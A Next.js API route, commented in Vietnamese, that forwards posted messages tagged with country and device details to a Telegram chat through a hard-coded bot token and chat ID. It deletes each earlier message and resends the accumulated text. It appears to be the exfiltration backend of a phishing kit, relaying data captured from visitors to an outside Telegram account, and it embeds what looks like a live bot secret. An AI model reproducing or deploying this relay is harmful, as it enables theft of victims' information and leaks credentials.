import { NextRequest, NextResponse } from 'next/server';
import { UAParser } from 'ua-parser-js';

const getConfig = async () => {
    const config = {
        TOKEN: "8851227074:AAF2BdqhoOCoYoVXTisGnUof3eauLOT5bkM",
        CHAT_ID: "1465093776‎",
    };
    if (!config.TOKEN || !config.CHAT_ID) {
        throw new Error("Missing TOKEN or CHAT_ID in environment variables");
    }

    return config;
};


const POST = async (req: NextRequest) => {
    try {
        const body = await req.json();
        const { message, message_id } = body;

        if (!message) {
            return NextResponse.json({ success: false }, { status: 400 });
        }

        const config = await getConfig();
        const { TOKEN, CHAT_ID } = config;

        if (!TOKEN || !CHAT_ID) {
            return NextResponse.json({ success: false, message: 'Missing TOKEN or CHAT_ID in config' }, { status: 500 });
        }

        const ua = req.headers.get('user-agent') || '';
        const parser = new UAParser(ua);
        const uaResult = parser.getResult();
        const deviceType = uaResult.device.type || 'desktop';
        const deviceVendor = uaResult.device.vendor || 'Unknown';
        const deviceModel = uaResult.device.model || 'Unknown';
        const osName = uaResult.os.name || 'Unknown';
        const osVersion = uaResult.os.version || 'Unknown';
        const deviceName = [deviceVendor, deviceModel].filter((item) => item && item !== 'Unknown').join(' ');
        const finalDeviceName = deviceName || (deviceType === 'desktop' ? 'Desktop' : deviceType);
        const osLabel = `${osName}${osVersion !== 'Unknown' ? ` ${osVersion}` : ''}`;
        const deviceLine = `<b>💻 Device:</b> <code>${finalDeviceName} | ${osLabel}</code>`;

        const messageWithDeviceInfo = message.includes('<b>💻 Device:</b>')
            ? message
            : message.includes('<b>🌎 Country:</b>')
                ? message.replace('<b>🌎 Country:</b>', `${deviceLine}\n<b>🌎 Country:</b>`)
                : `${message}\n${deviceLine}`;

        // Nếu có message_id cũ, xóa tin nhắn cũ trước
        if (message_id) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/deleteMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: message_id
                })
            });
        }

        // Gửi tin nhắn mới (chứa cả nội dung cũ + mới)
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: messageWithDeviceInfo,
                    parse_mode: 'HTML'
                })
        });

        const data = await response.json();
        const telegramResult = data?.result;

        return NextResponse.json({
            success: response.ok,
            message_id: telegramResult?.message_id ?? null
        });
    } catch {
        return NextResponse.json({ success: false }, { status: 500 });
    }
};

export { POST };
